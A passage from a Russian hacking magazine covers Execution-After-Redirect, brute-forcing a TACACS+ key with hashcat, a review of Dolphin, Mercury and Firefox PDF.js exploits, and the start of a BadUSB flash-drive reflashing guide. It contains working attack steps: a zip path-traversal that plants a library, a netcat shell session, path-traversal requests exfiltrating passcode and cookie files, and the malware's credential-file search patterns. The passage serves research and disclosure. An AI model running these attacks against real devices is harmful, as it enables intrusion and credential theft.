Весь последующий код тоже исполняется! Редирект означает лишь установку
соответствующих заголовков в ответ. В этом примере строка Welcome тоже по-
падет в ответ от сервера.
   Из-за того что браузер не отображает данные, которые поступили в ответе
с редиректом, пользователю будет казаться, что все в порядке. В итоге про-
граммисты считают, что после редиректа ничего произойти не может. При этом
многие языки и фреймворки не прекращают исполнение программы после ре-
директа, если об этом не позаботиться особо.
   Это и является уязвимостью EAR. Зная, что код после редиректа выполня-
ется, мы можем этим воспользоваться. Конечно, наши возможности зависят
от того, какой код находится после редиректа. Ведь мы не можем подпихнуть
туда что-то свое. Получается, что импакт атаки напрямую зависит от конкрет-
ного приложения.
  Выделяют два вида EAR: обычные и «слепые». Обычные — это такие, где
вывод для последующего после редиректа кода попадает в ответ от сервера.
Слепые — когда по тем или иным причинам вывод данных не попадает в ответ.
Благодаря EAR мы можем обходить кое-какие механизмы безопасности и по-
лучать интересные данные или выполнять некоторые действия в системе.
   Это свойство присуще многим языкам, но чаще всего веб-приложения пи-
шут на каком-то фреймворке, и те, в свою очередь, оборачивают функции ре-
директа. Поэтому каждый вариант нужно рассматривать отдельно с учетом
фреймворка.
   Так, в 2011-м было проведено исследование на эту тему, в котором проана-
лизировано девять фреймворков.
   Кратко пробегусь по итогам. В примере выше мы видели, что сам по себе PHP
уязвим к обоим видам EAR. Однако фреймворки CodeIgniter, Zend и CakePHP
по умолчанию неуязвимы. Питоновский Django или ASP.NET неуязвимы вовсе.
А вот J2EE, Struts, Ruby on Rails, Grails уязвимы к EAR, но только ко второму ее
виду, без возможности получить ответ с критичной инфой. В общем, уязвимых
платформ немало.
  При тестировании, если мы имеем дело с блекбоксом, нужно смотреть, что
содержат в себе ответы с редиректом (Burp не обманешь!). Еще можно пробо-
вать повторять все критичные действия, на которых есть редирект, под другим
пользователем. Ведь на самом деле EAR можно свести к «слабости» недоста-
точного разграничения доступа. Но конечно, зачастую проще всего найти эту
уязвимость, изучая исходники.

ЗАДАЧА: ПРОБРУТИТЬ КЛЮЧ К TACACS+

В прошлом выпуске Easy Hack я рассказывал про пару возможных атак на про-
токол TACACS+, который используется для централизованного управления ак-
каунтами устройств Сisco (роутеров, свитчей и так далее). Я тогда написал, что
протокол этот относительно защищенный. Приглядевшись получше, я понял,
как его можно поломать. К тому же, мне кажется, это показательный и простой
пример протокола, у которого проблемы с криптографией.
  Для начала напомню несколько основных фактов. TACACS+ — это кли-
ент-серверный протокол (TCP), который работает в формате запрос — ответ
(клиентом выступает устройство Cisco, а сервером — сервис TACACS+). Он под-
держивает шифрование трафика с использованием общего ключа (Pre-Shared
Key). При этом заголовки протокола не шифруются, а вот тела (данные) шифру-
ются полностью. Зашифрованные данные (enc_data) представляют собой ре-
зультат операции XOR с данными (data) и специальной строкой — pseudo_pad.

data^pseudo_pad=enc_data

pseudo_pad — это последовательность хешей MD5.

pseudo_pad = {MD5_1 [,MD5_2 [ ... ,MD5_n]]}

Хеши создаются на основании данных из заголовков пакетов TACACS+, плюс
общий ключ (PSK), плюс предыдущий хеш (для первого MD5 его нет).
MD5_1 = MD5{session_id, key, version, seq_no}
MD5_2 = MD5{session_id, key, version, seq_no, MD5_1}
....
MD5_n = MD5{session_id, key, version, seq_no, MD5_n-1}

где session_id — случайный идентификатор сессии; version — версия прото-
кола; seq_no — инкрементируемый номер пакета; key — PSK.





Пример заголовков пакетов TACACS+, используемых для генерации

Итак, у нас есть устройство Cisco и сервер TACACS+. Мы можем провести на них
атаку man-in-the-middle и видеть передаваемый трафик. Наша цель — получить
PSK и с помощью него расшифровать трафик и получить валидные учетки.
  Для начала, как мы видим, значение MD5 создается от нескольких значений,
но только одно из них мы точно не знаем — общий ключ. Все остальные можно
получить из заголовков TACACS+ пакета. Если упростить задачу, то все сво-
дится к тому, чтобы перебором (без этого — никуда) подобрать ключ. При этом
MD5 можно брутить в офлайне очень быстро. Но для этого нам нужно получить
значение MD5_1. Учитывая, что значения с MD5_2 по MD5_n содержат еще и пре-
дыдущее значение MD5, они для нас по большому счету бесполезны (получа-
ется второе неизвестное).
   Далее, мы должны вспомнить, что XOR — это обратимая операция. Если
у нас была операция data^pseudo_pad=enc_data, то pseudo_pad=data^enc_
data. При этом XOR — это простейшая операция, и изменение части строки
не влечет изменений в другой ее части. Получаем MD5_1 — это начальная часть
pseudo_pad (точнее, 128 бит или 16 байт). Таким образом, чтобы получить MD5_1,
нам нужно знать первые 16 байт зашифрованных данных и 16 байт изначальных
данных. И если зашифрованные данные мы имеем в любом количестве из тра-
фика, то как нам получить 16 байт изначальных данных?
   Давай взглянем на формат пакета пользовательских данных. Формат отли-
чается для запросов и ответов, а также для различных их видов (TACACS+ —
это Authentication, Authorization, Accounting).
   Пакет состоит из нескольких полей (четыре байта): Action, Priv Level, Auth
Type, Service. Они указывают на то, что кто-то хочет аутентифицироваться
на циске. При этом в большинстве случаев они будут иметь значение 01. Далее
User len, но в первом пакете аутентификации это значение не используется,
поэтому 00. Далее Port len — это длина имени терминала, на который проис-
ходит подключение. Для удаленных подключений должно быть 04. Далее длина
IP-адреса подключающегося. После — поле Data, которое тоже будет равно 00
для первого пакета. Далее — Port. Это номер или имя терминала у Cisco-де-
вайса. И последнее поле — это сам IP-адрес подключающегося (причем нас
интересуют только четыре байта от его начала, до полных 16 байт незашифро-
ванных данных).





Пример первого запроса аутентификации

Что же мы тут видим? Самое главное — отсутствие по-настоящему слу-
чайных значений. По моим наблюдениям, изменяются только Port, RemAddr
и RemAddrLen, возможно Priv Level. Но если мы можем провести MITM-атаку
на Cisco и TACACS+, то у нас есть и возможность подключаться к этой же циске
для аутентификации на ней (при этом валидных кред нам и не требуется знать).
В этой ситуации мы уже будем контролировать часть незашифрованных дан-
ных, передаваемых от устройства на TACACS+.
  Мы знаем свой IP и достаточно уверены в значении Priv  Level (мы ведь
пытаемся подключиться удаленно). Остается только Port. Но и тут значение,
скорее всего, будет tty плюс номер tty. А с учетом того, что у цисочки tty не так
много (обычно от 0 до 4) и идут они последовательно (в зависимости от количе-
ства параллельных сессий), мы приходим к выводу, что вариантов незашифро-
ванных данных первого пакета при нашей аутентификации один или два.
   Теперь у нас есть зашифрованные данные (enc_data), 16 байт незашифро-
ванных изначальных данных (data) и повторных. При помощи XOR мы получаем
хеш MD5_1 (точнее, несколько — в зависимости от количества вариантов неза-
шифрованных данных). Теперь мы можем скормить MD5 в oclHashCat и брутить
ключ. В случае успеха мы сможем расшифровать с тем же ключом и аутентифи-
кации реальных админов Cisco на TACACS+.
  Но это еще не все интересное, что можно выжать из этой атаки. Если побли-
же присмотришься к шифрованию протокола TACACS+, заметишь, что в MD5
используется поле seq_no, то есть номер пакета. Таким образом, для каждого
пакета данных будет генериться свой pseudo_pad, а это значит, что MD5_1 полу-
чится вытащить из любого запроса или ответа. Это значительно облегчает за-
дачу, так как мы можем выбрать пакет данных, в котором точно будем уверены.
Вот пара примеров.





Пример ответа от сервера TACACS+ со строкой-приветствием и запросом логина
   Ответ от сервера TACACS+ содержит в себе несколько полей с однознач-
ным значением и строку приветствия от Cisco для пользователя. Так как строку
приветствия мы можем получить при подключении, то выходит, что все значе-
ния мы знаем наверняка.
   Второй пример — это второй запрос от устройства Cisco. Все, что в нем пе-
редается, — это имя юзера и длина имени. Оба значения нам известны, если
аутентификацию проводим мы сами.
  Еще хотелось бы отметить небольшую трудность с hashcat. К сожалению,
в нем отсутствует метод для брута MD5 с двумя разными солями (в начале
и в конце последовательности). Приходится идти на уловки. Одна из них — ис-
пользование маски в качестве первой или второй соли. То есть одну из со-
лей мы хардкодим в маску. На примере ниже c002 — это версия протокола
TACACS+ и номер пакета в шестнадцатеричном виде, а первая соль лежит
в файле hashes.txt.

hashcat-cli64.exe -a 3 -m 20 --hex-charset
    --hex-salt hashes.txt ?d?d?d?dc002

К моменту публикации этой статьи я, наверное, уже успею доклепать мини-тул-
зу, которая облегчает выдергивание MD5 из пакета TACACS+. Не исключено,
что обнаружатся и какие-то другие тонкости этого протокола. Так что, возмож-
но, продолжим в следующем выпуске!
Взлом





                                                                           Борис «dukeBarman
                                                                                        Рютин»,
                                                                                   Цифровое оружие
                                                                                           и защита
                                                                                                              b.ryutin@zorsecurity.ru,
                                                                                         @dukebarman,
                                                                                                 dukebarman.pro
     WARNING

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
 АНАЛИЗ СВЕЖЕНЬКИХ УЯЗВИМОСТЕЙ
 Наш сегодняшний обзор будет посвящен уязвимостям в различных
браузерах. Начнем с анализа ошибок, которые исследователь rotlogix
 нашел в популярных браузерах для Android. Закончим уязвимостью
 нулевого дня в Mozilla Firefox, которую использовали для атаки через
 рекламные блоки на новостных сайтах. Хоть она и была оперативно
            устранена, но оставила небольшой осадок.


УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОДА
В DOLPHIN BROWSER ДЛЯ ANDROID

CVSSv2        N/A
Дата релиза:  22 августа 2015 года
 Автор:             rotlogix
 CVE:           N/A

Dolphin — популярный браузер для Android, количество установок которого на-
ходится в диапазоне от 50 до 100 миллионов. Уязвимость в нем — это не шутки.
   Атакующий, у которого есть возможность контролировать трафик пользова-
теля этого браузера, может изменить процесс загрузки и установки новых тем
оформления для браузера. В ходе такого изменения можно записать любой
файл в систему, что позволяет выполнить произвольный код в контексте уязви-
мого приложения. Для начала разберем подробно этот процесс.
   Загрузка выбранной темы оформления происходит по протоколу HTTP.

GET http://opsen-static.dolphin-browser.com/resources/
themestore/Red_roof.dwp

Она сохраняется в стандартной папке Download внешней карты.

root@hammerhead:/sdcard/Download # ls
Red_roof.dwp

Пусть тебя не смущает расширение dwp, это просто особенность браузера
Dolphin. На самом деле это обычный ZIP.

$ file Red_roof.dwp
Red_roof.dwp: Zip archive data, at least v2.0 to extract
Изучив содержимое, ты можешь увидеть данные, которые используются для
установки новой темы.

unzip -l Red_roof.dwp.orig
Archive:  Red_roof.dwp.orig
  Length     Date   Time    Name
 --------    ----   ----    ----
    18165  12-18-14 09:57   icon.jpg
      237  12-19-14 14:35   theme.config
   131384  12-18-14 09:54   wallpaper.jpg
 --------                   -------
   149786                   3 files

После реверсинга активности (Activity) приложения автор нашел обработчик,
который распаковывал скачанную тему и устанавливал соответствующую кон-
фигурацию.

EXPLOIT
Первым шагом эксплуатации станет проксирование трафика и инъекция моди-
фицированной темы. Для этого была выбрана программа mitmdump и неболь-
шой скрипт:
Запуск mitmdump для перехвата тем оформления браузера Dolphin

Также нам требуется что-то для эксплуатации процесса распаковки. Соот-
ветствующая технология подробно расписана исследователями из компании
NowSecure.
   Для ее использования нужна возможность записи произвольных файлов
и файл, который можно переписать. После небольшого анализа содержимого
автор нашел кандидата. Это библиотека ibdolphin.so.

root@hammerhead:/data/data/mobi.mgeek.TunnyBrowser # cd files/
root@hammerhead:/data/data/mobi.mgeek.TunnyBrowser/files # ls
AppEventsLogger.persistedevents
EN
icons_cache
libdolphin.so
name_service
splash.on

В качестве проверки был создан специальный архив:

unzip -l Red_roof.dwp
Archive:  Red_roof.dwp
  Length     Date   Time    Name
 --------    ----   ----    ----
    18165  12-18-14 09:57   icon.jpg
      237  12-19-14 14:35   theme.config
   131384  12-18-14 09:54   wallpaper.jpg
        7  08-21-15 20:26   ../../../../../../data/data/mobi.mgeek.
TunnyBrowser/files/libdolphin.so
 --------                   -------
   159142                   4 files
После успешного MITM-перехвата с нужной инъекцией и перемотки вывода от-
ладочной информации с устройства в Logcat было найдено то, что нужно.

D/dalvikvm( 2573): Trying to load lib /data/data/mobi.mgeek.
TunnyBrowser/files/libdolphin.so 0x42e0c318
E/dalvikvm( 2573): dlopen(“/data/data/mobi.mgeek.TunnyBrowser/files/
libdolphin.so”) failed: dlopen failed: “/data/data/mobi.mgeek.
TunnyBrowser/files/libdolphin.so” is too small to be an ELF executable
....
...
.
root@hammerhead:/data/data/mobi.mgeek.TunnyBrowser/files # cat libdolphin.so
foobar

Теперь нам надо создать свою библиотеку:





Для компилирования воспользуемся Android NDK и добавим ее в наш скрипт-пе-
рехватчик.
   Протестируем снова. После установки новой темы и рестарта браузера
в логах видим, что наша библиотека была успешно загружена:

D/dalvikvm(24702): Trying to load lib /data/data/mobi.mgeek.
TunnyBrowser/files/libdolphin.so 0x42e080a8
D/dalvikvm(24702): Added shared lib /data/data/mobi.mgeek.
TunnyBrowser/files/libdolphin.so 0x42e080a8

Теперь можем подсоединиться к атакованному устройству, используя стан-
дартный netcat:

> nc 10.174.90.159 6666
id
uid=10114(u0_a114) gid=10114(u0_a114) groups=1015(sdcard_rw),1028
(sdcard_r),3003(inet),50114(all_a114) context=u:r:untrusted_app:s0
ls
acct
cache
charger
config
d
data
default.prop
...
ueventd.rc
vendor





Проверка работы шелла на устройстве с уязвимым Dolphin browser

Исходники эксплоита можно скачать с гитхаба автора.

TARGETS
Dolphin Browser (версия на 27.07.2015 была уязвима).

SOLUTION
Разработчики уведомлены о проблеме.
УЯЗВИМОСТИ В БРАУЗЕРЕ MERCURY ДЛЯ ANDROID

CVSSv2        N/A
Дата релиза:  23 августа 2015 года
 Автор:             rotlogix
 CVE:           N/A

Mercury Browser тоже довольно популярен, хоть и меньше, чем Dolphin (у него
от полумиллиона до миллиона установок).
   Первое, что автор проверил при реверсинге браузеров для Android, — это
безопасность обработчика Intent для схем URI. В этом ему помог софт Lobotomy.
Он загрузил анализируемое приложение в него и воспользовался модулем
bowser.

(lobotomy) loader /Users/benjaminwatson/Android-Web-Browsers/mercury/
apk/com.ilegendsoft.mercury.apk
[2015-08-23 16:11:49.179402] Loading : /Users/benjaminwatson/
Android-Web-Browsers/mercury/apk/com.ilegendsoft.mercury.apk
(lobotomy) bowser enum
[2015-08-23 16:12:11.632313] Searching for parseUri()
1 Lcom/ilegendsoft/mercury/ui/widget/webview/g;->
shouldOverrideUrlLoading(Landroid/webkit/WebView; Ljava/lang/String;)
Z (0x260) ---> Landroid/content/Intent;->parseUri(Ljava/lang/String;
I)Landroid/content/Intent;
1 Lcom/ilegendsoft/mercury/ui/widget/webview/g;->
shouldOverrideUrlLoading(Landroid/webkit/WebView; Ljava/lang/String;)
Z (0x294) ---> Landroid/content/Intent;->parseUri(Ljava/lang/String;
I)Landroid/content/Intent;
1 Lcom/ilegendsoft/mercury/ui/widget/webview/g;->
shouldOverrideUrlLoading(Landroid/webkit/WebView; Ljava/lang/String;)
Z (0x31c) --->Landroid/content/Intent;->parseUri(Ljava/
lang/String; I)Landroid/content/Intent;





Использование модуля bowser для Lobotomy (начало)
Использование модуля bowser для Lobotomy (окончание)

Модуль bowser нашел несколько мест, где была вызвана функция parseUri(),
то есть где Intent URI-схема конвертируется в объект Intent.
   После небольшого анализа автор обнаружил, что в браузере имеется не-
безопасный код.





В Lobotomy имеются и веб-сервисы, основанные на Flask, которые можно ис-
пользовать для вызова этого кода.
Небезопасная реализация обработчика Intent позволяет атакующему запускать
private Activities (это такие активности, которые недоступны извне), исполь-
зуя специально созданную страницу. Далее автор загрузил Mercury Browser
в Lobotomy и запустил встроенные модули для поиска доступных компонентов.

...
..
.
[2015-08-23 13:07:39.810710] Activity : com.ilegendsoft.mercury.
ui.activities.PasscodeActivity
[2015-08-23 13:07:39.810722] Activity : com.ilegendsoft.mercury.
ui.activities.bookmark.BookmarksImportFilesActivity
[2015-08-23 13:07:39.810732] Activity : com.ilegendsoft.mercury.
ui.activities.FlipTabsActivity
[2015-08-23 13:07:39.810741] Activity : com.ilegendsoft.mercury.
ui.activities.SplashActivity
[2015-08-23 13:07:39.810750] Activity : com.ilegendsoft.mercury.
external.wfm.ui.WFMActivity2
[2015-08-23 13:07:39.810759] Activity : com.ilegendsoft.mercury.
external.zxing.CaptureActivity
[2015-08-23 13:07:39.810767] Activity : com.dropbox.client2.android.
AuthActivity
[2015-08-23 13:07:39.810830] Activity : com.ilegendsoft.mercury.
ui.activities.zcloud.PushUrlActivity
[2015-08-23 13:07:39.810864] Activity : com.ilegendsoft.mercury.
ui.activities.filemanager.FileManagerActivity
[2015-08-23 13:07:39.810877] Activity : com.ilegendsoft.mercury.
ui.activities.filemanager.SubFolderActivity
...
..
.

После нескольких проб и ошибок было найдено то, что нужно, — активность
com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2, которая явля-
ется private Actitivity внутри браузера Mercury. После дальнейшего реверсинга
оказалось, что у нее есть особенность, которая позволяет делать резервную
копию и восстанавливать что-то сохраненное на SD-карте браузером или дру-
гим приложением. Это стало возможно из-за того, что данная Activity вызывает-
ся Broadcast Receiver и зарегистрирована как обработчик для действия org.
join.action.SERV_AVAILABLE. Углубившись еще дальше, автор заметил, что
создаваемый сервис называется WebService и явно привязан к локальному
устройству. Внутри WebService находится метод onBind(), который, в свою
очередь, вызывает openWebServer():





Здесь автор понял, что созданный веб-сервер предназначен для обработки
данных на SD-карте браузером и доступен другим устройствам в локальной
сети.

((HttpRequestHandlerRegistry)localObject3).register(“/dodownload”,
   new HttpDownHandler(this.webRoot));
((HttpRequestHandlerRegistry)localObject3).register(“/dodelete”,
   new HttpDelHandler(this.webRoot));
((HttpRequestHandlerRegistry)localObject3).register(“/doupload”,
   new HttpUpHandler(this.webRoot));
((HttpRequestHandlerRegistry)localObject3).register(“/doprogress”,
   new HttpProgressHandler());

WebServer регистрирует специфичные URI-пути для скачивания, удаления
и загрузки файлов. У него есть еще одна особенность — он всегда биндится
на один и тот же порт, поэтому автор настроил проксирование трафика и начал
проверять перечисленные функции сервера.

EXPLOIT
После всех проверок исследователь нашел уязвимость типа раскрытия путей и
смог читать различные данные внутри директории Mercury.

/dodownload?fname=../../../../data/data/com.ilegendsoft.mercury/
shared_prefs/passcode.xml

Атакующий может не только скачать файлы с устройства, но и переписать их.

POST /doupload?dir=../../../../data/data/com.ilegendsoft.mercury/
shared_prefs/&id=c2f18b1f-8d77-4a73-98f8-2cb1461f70c4 HTTP/1.1
Host: 10.174.90.159:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0)
Gecko/20100101 Firefox/39.0
...
Content-Disposition: form-data; name=”Download/”; filename=”test.txt”
Content-Type: text/plain
test
-----------------------------20198766556454488091118231866--
root@hammerhead:/data/data/com.ilegendsoft.mercury/shared_prefs # ls
LASConfig.xml
...
test.txt
zcloud_db.xml

  В итоге для эксплуатации нам потребуется:
•  создать специальную HTML-страницу для вызова WiFi Manager Activity с Intent
   URI схемой;
•  узнать IP-адрес устройства;
•  опрашивая устройство, дождаться получения уведомления о вызове Activity;
•  проэксплуатировать уязвимость раскрытия путей.
   Для начала создадим специальную веб-страницу.





[~/Tools/mobile/android/lobotomy]> python web/run.py runserver
    -h 0.0.0.0
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
Mozilla/5.0 (Linux; Android 4.4.3; Nexus 5 Build/KTU84M)
AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0
Mobile Safari/537.36
10.174.90.159 - - [23/Aug/2015 16:37:13] “GET /exploits/mercury/wfm/
intent HTTP/1.1” 200 -

Опрашиваем веб-сервер до получения положительного ответа и пытаемся
прочесть файл с паролями.

[~/Tools/mobile/android/lobotomy/framework/brains/exploits/browser/
mercury]> python exploit.py
[2015-08-23 16:40:32.074803] Polling ...
[2015-08-23 16:40:34.095055] Polling ...
[2015-08-23 16:40:36.104810] Polling ...
[2015-08-23 16:40:38.114483] Polling ...
[2015-08-23 16:40:38.120936] Exploit engaged! Target IP :
10.174.90.159
[2015-08-23 16:40:38.120983] Exfilling /databases/mercury_database.db
[2015-08-23 16:40:38.278997] Exfilling /app_webview/Cookies
[2015-08-23 16:40:38.293556] Exfilling /shared_prefs/passcode.xml
...
<?xml version=’1.0’ encoding=’utf-8’ standalone=’yes’ ?>
<map>
    <string name=”passcode”>1234</string>
</map>
О других уязвимостях, найденных исследователем, ты можешь прочитать в его
блоге.

TARGETS
Mercury Browser (версия за 17.08.2015 была уязвима).

SOLUTION
На момент написания обзора о патче не было известно, и автор эксплоита ре-
комендует удалить этот браузер :).
0DAY-УЯЗВИМОСТЬ В PDF.JS БРАУЗЕРА MOZILLA FIREFOX

CVSSv2        N/A
 Дата релиза:  6 августа 2015 года
 Автор:          неизвестен, vincd
 CVE:           2015-4495

Закончим наш обзор уязвимостью в популярном и, наверное, любимом мно-
гими читателями браузере Mozilla Firefox. Данная уязвимость была найдена не
простыми исследователями и использовалась во вредоносной программе для
кражи различной конфиденциальной информации с компьютера пользователя.
Причем работает малварь как в Windows, так и в Linux, и OS X, о чем написано
в блоге разработчиков. 5 августа 2015 года об атаке сообщили читатели одно-
го из российских новостных сайтов. Она проводилась с использованием раз-
личных рекламных блоков.
   Суть уязвимости заключается в том, что атакующий может обойти ограни-
чения безопасности кода на JavaScript (same origin policy) и получить доступ к
браузерному просмотрщику PDF PDF.js. Благодаря этому появляется возмож-
ность читать содержимое различных локальных файлов пользователя и отправ-
лять его на указанные серверы. К примеру, на компьютере с Windows после
успешной эксплуатации осуществлялся поиск файлов конфигурации, которые
могли бы содержать пароли и другую интересную информацию.
   Разработчики из Mozilla сообщили о выявлении критической уязвимости
(CVE-2015-4495) и выпустили обновления Firefox 39.0.3 и 38.1.1 ESR.

EXPLOIT
Для эксплуатации создадим специальную HTML-страницу, которая запустит
атакующий JavaScript.





Суть кода проста: использование нескольких iframe и открытие файлов как
PDF. Полный исходник ты можешь найти на Github.
   Если тебе интересно, то можешь изучить оригинал вредоносного эксплои-
та, который опубликован в Pastebin разработчиков Ubuntu. В нем есть интерес-
ные регулярные выражения для поиска полезных файлов. Вот часть из них:

...”*сервер*.txt”,”*акк*.txt”,”*эккаунт*.txt”,”*впн*.txt”,
    “*впс*.txt”,”*вдс*.txt”,”*логин*.txt”...


TARGETS
Firefox < 39.0.3;
Firefox < 38.1.1 ESR.

SOLUTION
Исправлено в новых версиях.
ВЗЛОМ
ГАДКИЙ УТЕНОК
ПРЕВРАЩАЕМ
ОБЫЧНУЮ
ФЛЕШКУ
В USB
RUBBER
DUCKY





Как-то давно мы делали в журнале обзор девай-
сов, которые было бы желательно иметь в своем
чемоданчике хакера. Среди прочих девайсов там
был и USB Rubber Ducky — устройство, внеш-
не напоминающее обычную флешку, которое
притворяется клавиатурой и при подключении
к компьютеру быстренько набирает все заданные        Антон "ant" Жуков
                                                                                                       zhukov@glc.ruв нем команды. Штука крутая и очень полезная
при проведении пентестов, но зачем выклады-
вать за нее 40 баксов (да еще и при текущем
курсе), если аналогичным трюкам можно научить
обычную флешку?
ПРЕДИСЛОВИЕ
Прошлогодний Black Hat принес много интересных до-
кладов. В числе наиболее обсуждаемых был доклад, по-
священный неисправимой уязвимости USB-устройств,
позволяющей превращать обычные флешки в инстру-
мент распространения вредоносных программ. Атаку
назвали BadUSB, но позже в Сети появились шуточки      WARNING
на тему «USBola», сравнивающие эту атаку с известным                                                                  Не забывай, что ниже-
вирусом.                                                             описанные действия
  Подобные идеи использования HID-девайсов для ко-        с флешкой могут
                                                                         не только лишить тебярыстных целей были уже давно. Грех не воспользоваться                                                                            гарантии на устройство,
тем, что ОС система доверяет устройствам, подключа-                                                                        но и запросто убить де-
емым к USB-интерфейсу. Если покопаться в памяти, то     вайс. Экспериментируй
в журнале уже была статья по сходной тематике, в кото-      на свой страх и риск!
рой говорилось, как с помощью специального устрой-
ства Teensy можно взять под контроль машину с Windows
7 (в принципе — с любой ОС на борту). Устройство по внешнему виду напоми-
нало собой обычную флешку, под которую собственно и маскировалось. Все
это наводило на мысли, что с флеш-накопителями тоже можно провернуть та-
кой трюк.

ПРЕДПОСЫЛКИ
Вообще, USB — очень универсальный интерфейс. Только подумай, сколько
устройств мы к нему подключаем и в состав каких девайсов он входит! Мышки,
клавиатуры, принтеры, сканеры, геймпады, модемы, точки доступа, веб-каме-
ры, телефоны и т.д. и т.п. Мы не задумываясь вставляем коннектор в нужный
разъем, ОС автоматически определяет тип устройства и подгружает необхо-
димые драйвера.
  Но как она это делает?

УСТРОЙСТВО FLASH НАКОПИТЕЛЕЙ
На самом деле, ОС ничего не знает о подключаемом устройстве. Ей приходит-
ся ждать, пока девайс сам не сообщит, к какому классу устройств он принадле-
жит. Если взять простейший пример, когда мы втыкаем флешку в USB-разъем,
то флешка сообщает операционной системе не только что является накопи-
телем, но и свой объем. Тут сразу вспоминаются хитрожелтые китайские то-
варищи, которые таким образом научились выпускать флешки повышенной
емкости (встречались чуть ли не на пару терабайт). Чтобы разобраться, как та-
кое возможно, давай вспомним (или узнаем), как система распознает USB-у-
стройства.
Флешка без красивой обертки

АЛГОРИТМ ИНИЦИАЛИЗАЦИИ USB УСТРОЙСТВ
Назначение USB-устройств определяется кодами классов, которые сообща-
ются USB-хосту для загрузки необходимых драйверов. Коды классов позволя-
ют унифицировать работу с однотипными устройствами разных производите-
лей. Устройство может поддерживать один или несколько классов, количество
которых определяется количеством конечных точек (USB endpoints). В момент
подключения хост запрашивает у устройства ряд стандартизованных сведений
(дескрипторов), на основании которых принимает решение, как с этим устрой-
ством работать. Дескрипторы содержат сведения о производителе и типе
устройства, на основании которых хост подбирает программный драйвер.
  Обычная флешка будет иметь код класса 08h (Mass Storage Device — MSD),
в то время как веб-камера, снабженная микрофоном, будет характеризовать-
ся уже двумя: 01h (Audio) и 0Eh (Video Device Class).
  При подключении USB-устройства оно регистрируется, получает адрес
и отправляет свой дескриптор/дескрипторы, чтобы ОС загрузила необходи-
мые драйвера и отправила обратно необходимую конфигурацию. После это-
го начинается непосредственное взаимодействие с устройством. По завер-
шении работы происходит дерегистрация девайса. Важный момент, который
стоит тут отметить: устройства могут иметь несколько дескрипторов, а также
могут дерегистрироваться и регистрироваться в качестве другого устройства.
Классы устройств


Если вскрыть корпус флешки, то помимо запоминающего устройства (Mass
Storage), видимого пользователю, на плате будет еще и контроллер, отвечаю-
щий за описанные выше действия.





Единственная часть устройства, видимая пользователю
BAD USB ИЛИ НЕМНОГО ИСТОРИИ
Итак, на конференции Black Hat в прошлом году двое исследователей (Karsten
Nohl и Jakob Lell) поделились с общественностью опытом, как перепрошить
контроллер флешки своей прошивкой. По истечении некоторого времени та-
кая флешка регистрировалась в качестве клавиатуры и набирала заданные
команды. Из-за серьезности проблемы ребята не стали выкладывать код экс-
плойта. Однако, спустя некоторое время, двое других исследователей (Adam
Caudill и Brandon Wilson) уже на конференции Derbycon представили миру ра-
ботоспособный РоС, заточенный под микроконтроллер Phison 2251-03. Код
доступен на github.

ТРАНСФОРМАЦИЯ
Как ты понял, сегодня мы попробуем превратить обычную флешку в секретное
оружие пентестера!
  Прежде всего нам понадобится подходящий девайс. Так как код выложен
только для конкретного микроконтроллера, то у нас есть два варианта — либо
найти флешку, управляемую данным контроллером, либо провести очень не-
простую работу по исследованию и перепрошивке любого другого микро-
контроллера. В этот раз мы выберем более легкий путь и попробуем найти
подходящую флешку (а вот и список узявимого оборудования). Контроллер
достаточно распространенный, так что даже каким-то чудом у меня дома сре-
ди десятка флешек нашлась подходящая.

НАЧИНАЕМ КОЛДОВАТЬ
Найдя подходящий девайс (который не жалко в случае неудачи потерять), мож-
но приступать к его перевоплощению. Прежде всего нам потребуется скачать
исходники, которые выложили ребята. В принципе, содержание расписано
у них в официальной вики, но на всякий случай еще раз напомню, что же они
выложили на гитхаб:
•  DriveCom - приложение для взаимодействия с флешками, основанными
   на контроллере Phison;
•  EmbedPayload   -  приложение,  предназначенное  для  встраивания
   RubberDucky-скриптов inject.bin в кастомную прошивку с целью их по-
   следующего выполнения при подключении флешки;
•  Injector - приложение, извлекающее адреса из прошивки и встраивающее
   код патча в прошивку;
•  firmware - кастомная 8051 прошивка, написанная на С;
•  patch - коллекция 8051 патчей, написанных на С.
ПОДГОТАВЛИВАЕМ СИСТЕМУ
Скачав с гитхаба архив с сорцами, ты обнаружишь, что большинство из них
написано на С# и нуждается в компиляции, поэтому без студии не обойтись.
Еще один инструмент, который понадобится — Small Device C Compiler, или
SDCC. Его надо будет установить в C:\Program  Files\SDCC, он понадобится
для компиляции прошивки и патчей.
   Скомпилировав все инструменты, входящие в архив, можно будет еще раз
проверить, подходит ли данная флешка для перепрошивки:

DriveCom.exe /drive=F /action=GetInfo

где F — соответственно, буква накопителя.

ПОЛУЧАЕМ BURNER IMAGE
Следующим важным шагом является выбор подходящего burner image-а (8051
бинарник, ответственный за действия по дампу и заливке прошивки на устрой-
ство). Обычно их имена выглядят примерно так:

BNxxVyyyz.BIN

Где xx — номер версии контроллера (например, в случае PS2251-03 это будет
03), yyy — номер версии (не важно), а z отражает размер страницы памяти
и может быть следующим:
• 2KM - для 2K NAND чипов;
• 4KM - для 4K NAND чипов;
• M - для 8K NAND чипов.

Где искать подходящий burner image для своей флешки, можно посмотреть
по этой ссылке.

ДАМПИМ ОРИГИНАЛЬНУЮ ПРОШИВКУ
Прежде чем приступить к своим грязным эспериментам, которые могут убить
флешку, настоятельно рекомендуется все таки сделать дамп оригинальной
прошивки, чтобы, если что-то пойдет не так, можно было попытаться восстано-
виться работоспособность устройства. Сначала переводим девайс в boot-ре-
жим:

tools\DriveCom.exe /drive=F /action=SetBootMode

После этого опять нужно воспользоваться утилитой DriveCom, которой надо
будет передать букву нашего флеш-драйва, путь до burner image-а и путь к фай-
лу, в который будет сохранена оригинальная сдампленная прошивка. Выгля-
деть это будет так:

tools\DriveCom.exe /drive=F /action=DumpFirmware
    /burner=BN03V104M.BIN /firmware=fw.bin

Если ты все сделал правильно, то исходная прошивка сохранится в файл fw.bin.

ПОДГОТАВЛИВАЕМ PAYLOAD
Теперь настало время подумать о том, какой функционал мы хотим получить
от нашей флешки. Если вспомнить Teensy, для него есть отдельный тулкит
